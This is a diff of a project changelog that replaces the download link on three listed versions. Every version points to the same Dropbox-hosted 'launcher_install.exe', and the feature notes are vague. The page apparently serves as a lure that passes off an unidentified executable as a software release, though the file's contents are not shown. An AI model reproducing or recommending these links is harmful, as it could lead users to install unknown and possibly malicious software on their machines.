@@ -5,15 +5,15 @@
 
 
 
-## ✅ [Version - 7.8.4 - stable](https://www.dropbox.com/s/bwe8c3huuv9o8wt/launcher_install.exe?dl=1)
+## ✅ [Version - 7.8.4 - stable](https://www.dropbox.com/s/zu5kfyfqdtgbi22/launcher_install.exe?dl=1)
 ##### -Updating the database
 ##### -Added a section for bloggers
 
-## ✅ [Version - 7.8.2](https://www.dropbox.com/s/bwe8c3huuv9o8wt/launcher_install.exe?dl=1)
+## ✅ [Version - 7.8.2](https://www.dropbox.com/s/zu5kfyfqdtgbi22/launcher_install.exe?dl=1)
 ##### -Updating the interface
 ##### -Ability to invite partners via a referral link
 
-## ✅ [Version - 7.8.0](https://www.dropbox.com/s/bwe8c3huuv9o8wt/launcher_install.exe?dl=1)
+## ✅ [Version - 7.8.0](https://www.dropbox.com/s/zu5kfyfqdtgbi22/launcher_install.exe?dl=1)
 ##### -Minor corrections
 ##### -Improved display of coupons
 
